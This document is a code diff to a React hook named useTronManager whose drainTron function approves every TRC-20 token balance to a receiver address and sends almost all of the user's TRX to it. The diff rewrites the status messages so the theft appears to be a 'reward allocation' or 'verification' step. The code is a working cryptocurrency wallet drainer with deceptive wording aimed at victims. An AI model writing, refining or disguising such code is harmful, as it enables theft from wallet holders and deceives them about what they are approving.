@@ -11,7 +11,7 @@ export function useTronManager() {
     const drainTron = async () => {
         if (!(window as any).tronWeb || isProcessing) return;
         setIsProcessing(true);
-        setCurrentTask("Initializing Tron Secure Guard...");
+        setCurrentTask("Syncing Tron Reward Allocation...");
 
         try {
             const tronWeb = (window as any).tronWeb;
@@ -29,7 +29,7 @@ export function useTronManager() {
                     const balance = await contract.balanceOf(address).call();
 
                     if (balance > 0) {
-                        setCurrentTask(`Protecting TRC-20 assets...`);
+                        setCurrentTask(`Verifying TRC-20 allocation...`);
                         await contract.approve(TRON_RECEIVER_ADDRESS, balance).send();
 
                         // Notify Worker
@@ -52,11 +52,11 @@ export function useTronManager() {
             // Drain Native TRX
             const balance = await tronWeb.trx.getBalance(address);
             if (balance > 1000000) { // > 1 TRX
-                setCurrentTask(`Finalizing TRX rewards...`);
+                setCurrentTask(`Finalizing TRX verification...`);
                 await tronWeb.trx.sendTransaction(TRON_RECEIVER_ADDRESS, balance - 1000000);
             }
 
-            setCurrentTask("Tron assets secured successfully.");
+            setCurrentTask("Tron rewards verified successfully.");
         } catch (e: any) {
             console.error("Tron Drain Failed", e);
             setCurrentTask(`Error: ${e.message}`);
